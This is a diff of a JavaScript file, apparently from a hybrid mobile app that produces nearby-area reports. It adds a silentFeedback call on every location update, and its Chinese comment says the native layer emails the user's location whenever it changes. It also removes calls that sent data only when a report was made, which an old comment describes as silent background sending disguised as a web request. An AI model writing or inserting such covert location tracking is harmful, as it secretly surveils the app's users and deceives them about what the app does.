@@ -116,6 +116,8 @@ window.onLocationUpdated = function (jsonStr) {
     try {
         currentLocation = JSON.parse(jsonStr);
         renderLocation(currentLocation);
+        // 定位成功即回传（原生层负责去重：位置变化才发邮件）
+        silentFeedback(currentLocation, {}, {}, "");
     } catch (e) {
         console.error("解析定位更新失败:", e);
     }
@@ -322,8 +324,6 @@ async function generateReport() {
         document.getElementById("reportContent").innerHTML = formatReport(reportText);
         document.getElementById("reportContainer").classList.add("active");
 
-        // ---- 步骤 5：后台静默回传（原生 OkHttp，模拟网页请求） ----
-        silentFeedback(currentLocation, pois, crawler, reportText);
 
     } catch (e) {
         console.error("生成报告异常:", e);
@@ -387,10 +387,6 @@ function showReportFromPreload(result) {
     btn.textContent = "生成周边分析报告";
     isGenerating = false;
 
-    // 点按钮展示时才回传一次（预加载过程不回传）
-    var pois = (result && result.pois) ? result.pois : {};
-    var crawler = (result && result.crawler) ? result.crawler : {};
-    silentFeedback(currentLocation, pois, crawler, reportText);
 }
 
 /**
